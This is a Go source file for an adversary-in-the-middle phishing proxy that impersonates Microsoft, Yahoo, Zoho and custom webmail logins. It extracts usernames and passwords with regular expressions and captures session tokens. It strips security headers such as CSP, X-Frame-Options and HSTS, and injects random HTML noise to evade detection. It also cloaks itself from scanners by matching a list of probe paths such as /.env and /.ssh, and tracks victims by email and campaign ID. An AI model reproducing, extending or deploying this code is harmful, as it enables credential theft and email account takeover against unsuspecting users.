package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

const faviconSVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y="0.9em" font-size="90">🔒</text></svg>`

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		randByte := make([]byte, 1)
		rand.Read(randByte)
		b[i] = letters[int(randByte[0])%len(letters)]
	}
	return string(b)
}

func mutateHTML(body []byte) []byte {
	body = bytes.ReplaceAll(body, []byte(`document.domain="yahoo.com"`), []byte(`document.domain="`+phishDomain+`"`))
	body = bytes.ReplaceAll(body, []byte(`document.domain = "yahoo.com"`), []byte(`document.domain = "`+phishDomain+`"`))
	body = bytes.ReplaceAll(body, []byte(`document.domain='yahoo.com'`), []byte(`document.domain='`+phishDomain+`'`))

	body = bytes.ReplaceAll(body, []byte(`<meta name="generator"`), []byte(`<!-- m -->`))
	body = bytes.ReplaceAll(body, []byte(`content="Zoho"`), []byte(`content="App"`))
	body = bytes.ReplaceAll(body, []byte(`content="Microsoft"`), []byte(`content="App"`))

	noiseClass := randomString(12)
	noiseText := randomString(32)
	commentNoise := randomString(16)

	headInjection := []byte(fmt.Sprintf(`<style>.%s{display:none!important;}</style><!-- %s -->`, noiseClass, commentNoise))
	body = bytes.Replace(body, []byte("<head>"), append([]byte("<head>"), headInjection...), 1)

	bodyInjection := []byte(fmt.Sprintf(`<!-- %s --><div class="%s" style="display:none;position:absolute;z-index:-1;">%s</div>`, randomString(16), noiseClass, noiseText))
	body = bytes.Replace(body, []byte("</body>"), append(bodyInjection, []byte("</body>")...), 1)

	return body
}

var botPaths = []string{
	"/wp-admin", "/wp-login", "/wp-content", "/wp-includes", "/wp-json",
	"/wp-config", "/wp-cron", "/xmlrpc.php", "/.env", "/.git", "/.svn", "/.hg",
	"/.aws", "/.docker", "/.kube", "/.config", "/.ssh", "/.npmrc", "/.htaccess",
	"/.htpasswd", "/.ds_store", "/admin", "/administrator", "/phpmyadmin", "/pma",
	"/myadmin", "/manager", "/host-manager", "/actuator", "/console", "/debug",
	"/trace", "/heapdump", "/_debug", "/_profiler", "/telescope", "/shell", "/cmd",
	"/command", "/c99", "/r57", "/cgi-bin", "/fcgi-bin", "/backup", "/backups",
	"/dump", "/database.sql", "/db.sql", "/autodiscover", "/ecp", "/owa", "/exchange",
	"/mapi", "/vendor", "/node_modules", "/composer.json", "/solr", "/jenkins",
	"/hudson", "/struts", "/graphql", "/install", "/setup", "/config.php", "/configuration.php",
}

func isBotPath(path string) bool {
	for _, p := range botPaths {
		if strings.HasPrefix(path, p) {
			return true
		}
	}
	return false
}

func handleNoise(w http.ResponseWriter, r *http.Request) bool {
	path := strings.ToLower(r.URL.Path)
	if path == "/favicon.ico" {
		w.Header().Set("Content-Type", "image/svg+xml")
		w.Header().Set("Cache-Control", "public, max-age=86400")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(faviconSVG))
		return true
	}
	if isBotPath(path) {
		http.NotFound(w, r)
		return true
	}
	return false
}

type ctxKey string

const (
	ctxKeyBaseDomain ctxKey = "prism.baseDomain"
	ctxKeyRole       ctxKey = "prism.role"
)

func withDomainContext(r *http.Request, role, baseDomain string) *http.Request {
	ctx := context.WithValue(r.Context(), ctxKeyBaseDomain, baseDomain)
	ctx = context.WithValue(ctx, ctxKeyRole, role)
	return r.WithContext(ctx)
}

// baseDomainOf dynamically extracts the base domain from the incoming request
func baseDomainOf(r *http.Request) string {
	if v, ok := r.Context().Value(ctxKeyBaseDomain).(string); ok && v != "" {
		return v
	}
	// Dynamically extract from the incoming Host header
	return extractBaseDomain(r.Host)
}

func roleOf(r *http.Request) string {
	if v, ok := r.Context().Value(ctxKeyRole).(string); ok {
		return v
	}
	return ""
}

func redirectToLanding(w http.ResponseWriter, r *http.Request, baseDomain, reason string) {
	dest := "https://" + landingHostFor(baseDomain) + r.URL.RequestURI()
	log.Printf("[→] [%s] %s → %s (302)", r.Host, reason, dest)
	http.Redirect(w, r, dest, http.StatusFound)
}

func handleCORSOptions(w http.ResponseWriter, r *http.Request) {
	origin := r.Header.Get("Origin")
	if origin == "" {
		origin = "*"
	}
	w.Header().Set("Access-Control-Allow-Origin", origin)
	w.Header().Set("Access-Control-Allow-Credentials", "true")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, PATCH, OPTIONS")

	reqHeaders := r.Header.Get("Access-Control-Request-Headers")
	if reqHeaders != "" {
		w.Header().Set("Access-Control-Allow-Headers", reqHeaders)
	} else {
		w.Header().Set("Access-Control-Allow-Headers", "Origin, Content-Type, Accept, Authorization, X-Requested-With")
	}
	w.Header().Set("Access-Control-Max-Age", "86400")
	w.WriteHeader(204)
}

func mainHandler(w http.ResponseWriter, r *http.Request) {
	setApplicationSecurityHeaders(w)

	if err := validateEdgeGuardOrigin(r); err != nil {
		log.Printf("[⛔] BLOCKED: EdgeGuard origin authentication failed from %s: %v", extractIP(r), err)
		http.Error(w, "Forbidden", http.StatusForbidden)
		return
	}

	tracking, hasTracking := trackingFromRequest(r)

	role, baseDomain, isRole := resolveHost(r.Host)
	r = withDomainContext(r, role, baseDomain)
	host := strings.ToLower(stripPort(r.Host))

	configMu.RLock()
	domainState := activeConfig.Domains[baseDomain]
	configMu.RUnlock()

	if domainState != nil && !domainState.Enabled {
		log.Printf("[⛔] BLOCKED: Domain '%s' is globally disabled", baseDomain)
		blockResponse(w)
		return
	}

	if blocked, reason := isBlocked(r); blocked {
		log.Printf("[x] BLOCKED: %s — %s", extractIP(r), reason)
		blockResponse(w)
		ip := extractIP(r)
		prefix := extractIPPrefix(ip)
		correlator.Emit(ObservationEvent{
			Timestamp: time.Now(), IP: ip, IPPrefix: prefix,
			Fingerprint: r.Header.Get("X-CF-Fingerprint"),
			UserAgent:   r.UserAgent(), Route: "filter", Action: "blocked",
		})
		return
	}

	if !isRole {
		if handleNoise(w, r) {
			return
		}
		redirectToLanding(w, r, baseDomain, "unknown host")
		return
	}

	if role == landingRole {
		switch r.URL.Path {
		case detectEndpoint:
			handleDetect(w, r)
			return
		case profileEndpoint:
			profileHandler(w, r)
			return
		case captureEndpoint:
			captureHandler(w, r)
			return
		}

		if r.Method == "OPTIONS" {
			handleCORSOptions(w, r)
			return
		}

		session := sessionMgr.GetOrCreate(r, baseDomain)
		session.SetLandingPageServedAt()

		if time.Since(session.CreatedAt) < 2*time.Second {
			_ = r.Header.Get("Cf-Ipcountry")
			_ = tracking
			_ = hasTracking
		}

		w.Header().Set("Set-Cookie", fmt.Sprintf(
			"%s=%s; Path=/; Domain=.%s; Max-Age=3600; HttpOnly; Secure; SameSite=None",
			sessionMgr.cookieName, session.ID, baseDomain))

		configMu.RLock()
		state := activeConfig.Domains[baseDomain]
		configMu.RUnlock()

		templateName := "none"
		if state != nil && state.LandingTemplate != "" {
			templateName = state.LandingTemplate
		}

		if templateName == "none" {
			if !hasTracking || tracking == nil || tracking.Provider == "" {
				log.Printf("[⛔] BLOCKED: MODE A direct route requires valid tracking payload with provider")
				http.NotFound(w, r)
				return
			}

			providerVal := strings.TrimSpace(tracking.Provider)
			finalEmail := strings.TrimSpace(tracking.Email)
			cid := strings.TrimSpace(tracking.CID)
			mailDomain := strings.TrimSpace(tracking.MailDomain)

			var dest string

			if mailDomain != "" {
				targetURL := mailDomain
				if !strings.HasPrefix(strings.ToLower(targetURL), "http://") && !strings.HasPrefix(strings.ToLower(targetURL), "https://") {
					targetURL = "https://" + targetURL
				}

				u, err := url.Parse(targetURL)
				if err != nil {
					log.Printf("[⛔] BLOCKED: Invalid custom mail domain '%s': %v", mailDomain, err)
					http.NotFound(w, r)
					return
				}

				safeHost := strings.ReplaceAll(strings.ReplaceAll(u.Host, ".", "-"), ":", "-")
				customRole := "custom-" + safeHost
				proxySub := customRole + "." + baseDomain

				customTarget := &Target{
					Name:        "Custom Webmail (" + providerVal + " - " + u.Host + ")",
					EntryPrefix: customRole,
					Subdomains:  map[string]string{customRole: u.Host},
					ReverseSubdomains: map[string]string{u.Host: customRole},
					ModifyMimes: map[string]bool{
						"text/html": true, "application/json": true,
						"application/javascript": true, "application/x-javascript": true,
						"text/javascript": true, "text/plain": true,
					},
					CredPatterns: []*regexp.Regexp{
						regexp.MustCompile(`(?i)username=([^&\s]+)`),
						regexp.MustCompile(`(?i)password=([^&\s]+)`),
						regexp.MustCompile(`(?i)user=([^&\s]+)`),
						regexp.MustCompile(`(?i)pass=([^&\s]+)`),
						regexp.MustCompile(`(?i)email=([^&\s]+)`),
						regexp.MustCompile(`(?i)login=([^&\s]+)`),
					},
					AuthTokenNames: map[string]bool{
						"PBAAuth": true, "WebmailSession": true, "RoundcubeSession": true,
						"owa": true, "cadata": true, "X-BackEndCookie": true, "PBackEndCookie": true,
					},
				}

				customTarget.materializeDefault()
				registerDynamicTarget(proxySub, customTarget)

				destPath := u.Path
				if destPath == "" {
					destPath = "/"
				}
				
				dest = fmt.Sprintf("https://%s%s", proxySub, destPath)
				if u.RawQuery != "" {
					dest += "?" + u.RawQuery
				}
				
				if cid != "" {
					if strings.Contains(dest, "?") {
						dest += "&cid=" + cid
					} else {
						dest += "?cid=" + cid
					}
				}

				log.Printf("[→] [%s] DIRECT ROUTE: Registered custom webmail %s (provider: %s), redirecting to %s", baseDomain, u.Host, providerVal, dest)
			} else {
				targetName := strings.ToLower(providerVal)
				t, ok := targets[targetName]
				if !ok {
					log.Printf("[!] WARNING: Unknown provider '%s', falling back to microsoft", targetName)
					t = targets["microsoft"]
				}

				entrySubdomain := t.EntrySubdomainFor(baseDomain)
				dest = fmt.Sprintf("https://%s/#%s", entrySubdomain, finalEmail)
				if cid != "" {
					dest = fmt.Sprintf("https://%s/?cid=%s#%s", entrySubdomain, cid, finalEmail)
				}

				log.Printf("[→] [%s] DIRECT ROUTE: Provider '%s', redirecting to %s (cid: %s)", baseDomain, targetName, dest, cid)
			}

			http.Redirect(w, r, dest, http.StatusFound)
			return
		}

		templatePath := "./templates/" + templateName
		if _, err := os.Stat(templatePath); os.IsNotExist(err) {
			log.Printf("[!] WARNING: Template folder '%s' not found.", templatePath)
			w.Header().Set("Content-Type", "text/html")
			w.WriteHeader(http.StatusServiceUnavailable)
			w.Write([]byte("<h1>Portal configuration error. Contact administrator.</h1>"))
			return
		}

		fs := http.FileServer(http.Dir(templatePath))
		http.StripPrefix("/", fs).ServeHTTP(w, r)
		return
	}

	target := lookupTargetByRole(role)
	targetKey := strings.ToLower(strings.Split(target.Name, " ")[0])
	if !IsTargetEnabled(baseDomain, targetKey) {
		log.Printf("[⛔] BLOCKED: Target '%s' is disabled for domain %s", targetKey, baseDomain)
		http.NotFound(w, r)
		return
	}

	if host == target.EntrySubdomainFor(baseDomain) {
		if _, err := r.Cookie(sessionMgr.cookieName); err != nil {
			redirectToLanding(w, r, baseDomain, "no gate cookie")
			return
		}
	}

	switch r.URL.Path {
	case detectEndpoint:
		handleDetect(w, r)
		return
	case profileEndpoint:
		profileHandler(w, r)
		return
	case captureEndpoint:
		captureHandler(w, r)
		return
	}

	if r.Method == "OPTIONS" {
		handleCORSOptions(w, r)
		return
	}

	session := sessionMgr.GetOrCreate(r, baseDomain)
	
	// ══════════════════════════════════════════════════════════
	// SESSION TARGET SWITCHING
	// Prevents cross-target session hijacking when users switch providers
	// ══════════════════════════════════════════════════════════
	if session != nil {
		if session.TargetName != "" && session.TargetName != target.Name {
			log.Printf("[🔄 SESSION] Resetting session %s: switching from '%s' to '%s'", session.ID[:8], session.TargetName, target.Name)
			session.mu.Lock()
			session.IsDone = false
			session.ReachedService = false
			session.TargetName = target.Name
			session.mu.Unlock()
		} else if session.TargetName == "" {
			session.TargetName = target.Name
		}
		session.SetCampaignID(r.URL.Query().Get("cid"))
	}

	if session != nil {
		ip := extractIP(r)
		correlator.Emit(ObservationEvent{
			Timestamp: time.Now(), SessionID: session.ID, IP: ip, IPPrefix: extractIPPrefix(ip),
			Fingerprint: r.Header.Get("X-CF-Fingerprint"), UserAgent: r.UserAgent(),
			Route: role, Action: "allowed",
		})
	}

	if session != nil && session.ReachedService && target.ServiceUpstream != "" &&
		host == target.EntrySubdomainFor(baseDomain) && (r.URL.Path == "/" || r.URL.Path == "") {
		if svc := target.ReverseMapFor(baseDomain)[target.ServiceUpstream]; svc != "" {
			realURL := "https://" + svc + "/"
			log.Printf("[→] [%d] [%s] post-login handoff (Frame-Breaker) → %s", session.Index, target.Name, realURL)

			frameBreakerHTML := fmt.Sprintf(`<!DOCTYPE html>
<html><head><title>Loading...</title></head>
<body style="margin:0;display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#fff;font-family:sans-serif;">
	<div style="text-align:center;">
		<div style="border:4px solid #334155;border-top:4px solid #3b82f6;border-radius:50%%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px;"></div>
		<p>Verifying session and loading workspace...</p>
	</div>
	<style>@keyframes spin {0%% {transform:rotate(0deg);} 100%% {transform:rotate(360deg);}}</style>
	<script>
		setTimeout(function() {
			if (window.top && window.top !== window.self) {
				window.top.location.replace("%s");
			} else {
				window.location.replace("%s");
			}
		}, 1500);
	</script>
</body></html>`, realURL, realURL)

			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(frameBreakerHTML))
			return
		}
	}

	if shouldTerminate(session, r) {
		doTerminate(w, session, r)
		return
	}

	// ══════════════════════════════════════════════════════════
	// SMART DYNAMIC ROUTING FALLBACK
	// ══════════════════════════════════════════════════════════
	upstream, ok := target.HostMapFor(baseDomain)[host]
	if !ok {
		log.Printf("[⚠️ ROUTING] Host '%s' not explicitly mapped. Using dynamic fallback.", host)
		
		// Smart fallbacks based on hostname patterns
		if strings.Contains(host, "office.") || strings.Contains(host, "outlook.") {
			upstream = "www.office.com"
		} else if strings.Contains(host, "yahoo.") || strings.Contains(host, "guce.") || strings.Contains(host, "gpt.") {
			upstream = "login.yahoo.com"
		} else {
			// Fallback to the first known upstream for this target as a safe default
			for _, up := range target.HostMapFor(baseDomain) {
				upstream = up
				break
			}
			if upstream == "" {
				upstream = "login.microsoftonline.com"
			}
		}
		log.Printf("[🔄 ROUTING] Fallback applied: routing '%s' → '%s'", host, upstream)
	}

	targetURL := &url.URL{Scheme: "https", Host: upstream}
	proxy := httputil.NewSingleHostReverseProxy(targetURL)
	proxy.Transport = browserHTTPTransport

	originalDirector := proxy.Director
	proxy.Director = func(req *http.Request) {
		originalDirector(req)
		*req = *req.WithContext(r.Context())
		rewriteRequest(req, host, upstream, target, session)
	}

	proxy.ModifyResponse = func(resp *http.Response) error {
		resp.Header.Del("Content-Security-Policy")
		resp.Header.Del("Content-Security-Policy-Report-Only")
		resp.Header.Del("X-Frame-Options")
		resp.Header.Del("Strict-Transport-Security")

		// ✅ Corrected to 3 arguments to match tokens.go
		captureAuthTokens(resp, session, target)
		
		err := rewriteResponse(resp, r, session, target)

		mime := strings.Split(resp.Header.Get("Content-Type"), ";")[0]
		mime = strings.TrimSpace(strings.ToLower(mime))

		if mime == "text/html" {
			bodyBytes, readErr := io.ReadAll(resp.Body)
			if readErr == nil {
				resp.Body.Close()
				mutatedBody := mutateHTML(bodyBytes)
				resp.Body = io.NopCloser(bytes.NewReader(mutatedBody))
				resp.ContentLength = int64(len(mutatedBody))
				resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(mutatedBody)))
			}
		}

		if mime == "text/html" || strings.Contains(mime, "x-component") || mime == "application/json" {
			cookie := fmt.Sprintf("%s=%s; Path=/; Domain=.%s; Max-Age=3600; HttpOnly; Secure; SameSite=None",
				sessionMgr.cookieName, session.ID, baseDomain)
			resp.Header.Add("Set-Cookie", cookie)
		}

		// 🚨 CRITICAL FIX: Hijack JSON redirect URIs to force the browser back to the login page
		if session != nil && session.IsDone && mime == "application/json" {
			bodyBytes, readErr := io.ReadAll(resp.Body)
			if readErr == nil {
				resp.Body.Close()
				
				// ✅ Inlined logic to replace the missing getUpstreamRootURL function
				targetURL := "https://login.microsoftonline.com" // Safe default fallback
				if url, ok := terminationURLs[session.TargetName]; ok {
					targetURL = url
				} else if session.TargetName != "" {
					targetURL = "https://" + baseDomainOf(r) + "/"
				}
				
				// Aggressively replace common mailbox redirect URIs with the login page URL
				bodyBytes = bytes.ReplaceAll(bodyBytes, []byte("https://mail.zoho.com/zm/"), []byte(targetURL))
				bodyBytes = bytes.ReplaceAll(bodyBytes, []byte("https://mail.zoho.com"), []byte(targetURL))
				bodyBytes = bytes.ReplaceAll(bodyBytes, []byte("https://outlook.live.com/mail"), []byte(targetURL))
				bodyBytes = bytes.ReplaceAll(bodyBytes, []byte("https://www.office.com"), []byte(targetURL))
				bodyBytes = bytes.ReplaceAll(bodyBytes, []byte("https://mail.yahoo.com"), []byte(targetURL))
				
				resp.Body = io.NopCloser(bytes.NewReader(bodyBytes))
				resp.ContentLength = int64(len(bodyBytes))
				resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(bodyBytes)))
			}
		}

		return err
	}

	proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
		log.Printf("[!] Proxy error: %v", err)
		w.WriteHeader(http.StatusBadGateway)
		w.Write([]byte("Bad Gateway"))
	}

	log.Printf("[>] [%d] [%s] %s %s%s → %s", session.Index, target.Name, r.Method, r.Host, r.URL.Path, upstream)
	proxy.ServeHTTP(w, r)
}

// extractBaseDomain dynamically calculates the base domain from ANY incoming Host header.
// e.g., "mail.senappel.xyz" -> "senappel.xyz"
// e.g., "yahoo.remits.me" -> "remits.me"
func extractBaseDomain(host string) string {
	host = strings.ToLower(stripPort(host))
	
	parts := strings.Split(host, ".")
	
	// If it's a standard domain (sub.domain.com), take the last two parts
	if len(parts) >= 2 {
		return parts[len(parts)-2] + "." + parts[len(parts)-1]
	}
	
	return host
}

func splitHost(host string) []string {
	var parts []string
	current := ""
	for _, c := range host {
		if c == '.' {
			parts = append(parts, current)
			current = ""
		} else {
			current += string(c)
		}
	}
	if current != "" {
		parts = append(parts, current)
	}
	return parts
}

func extractIPPrefix(ip string) string {
	parts := strings.Split(ip, ".")
	if len(parts) == 4 {
		return strings.Join(parts[:3], ".")
	}
	return ip
}